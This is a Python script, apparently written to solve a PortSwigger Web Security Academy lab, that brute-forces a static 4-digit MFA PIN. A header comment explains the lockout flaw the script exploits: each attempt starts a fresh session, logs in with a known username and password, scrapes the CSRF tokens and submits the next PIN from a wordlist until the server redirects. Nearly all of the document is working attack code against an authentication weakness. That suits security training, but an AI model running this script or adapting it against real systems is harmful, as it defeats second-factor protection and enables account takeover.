#the user must authenticate with a name/password and then a second time with a pin.  the pin remains static.  although if the user
#attempts too many incorrect pins he/she will be logged out, if the user instead after an incorrect pin attempt logs back in and attempts another pin, the user will NOT be locked out.  the pin is only 4 numbers.  the script, albeit slow, logs in and attempts a pin until it gets it right.  again, not so realistic in that the pin is not reset upon each login.  but, this is for a portswigger exercise and it worked.  
#!/usr/bin/python3
import os
import warnings
from bs4 import BeautifulSoup
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
import itertools

warnings.simplefilter('ignore',InsecureRequestWarning) #ignores insecure certificate warning
	

def get_pin():
	with open("secure_pin3.txt","r") as f:
		for line in f:
			for word in line.split():
				s = requests.session()
			
				#request the login page and obtain the session assigned from the request and obtain the csfr and login
				response = s.get('https://0a0a0075033fee6bc0a0e96100ff0078.web-security-academy.net/login', proxies=proxy, verify=False)
#				session_var = response.cookies['session']
#				cookies = {'session': session_var}
				soup = BeautifulSoup(response.content, 'html.parser')
				source = soup.find('input', attrs={'name' : 'csrf'})
				output = source['value']
				data = {'username': 'carlos', 'password' : 'montoya', 'csrf' : output}
				
				#login with username and password, and obtain the session assigned from the pin request following successful login
				login = s.post('https://0a0a0075033fee6bc0a0e96100ff0078.web-security-academy.net/login', data=data, proxies = proxy, verify=False)
				soup2 = BeautifulSoup(login.content, 'html.parser')
				source2 = soup2.find('input', attrs={'name' : 'csrf'})
				output2 = source2['value']
				
				data2 = {'csrf' : output2 , 'mfa-code': word}
				
				pin_crack = s.post('https://0a0a0075033fee6bc0a0e96100ff0078.web-security-academy.net/login2', data=data2, proxies = proxy, verify=False)
				print(pin_crack.status_code)
				if pin_crack.status_code == 302:
					print("PIN is likely " + word)
					break

get_pin()
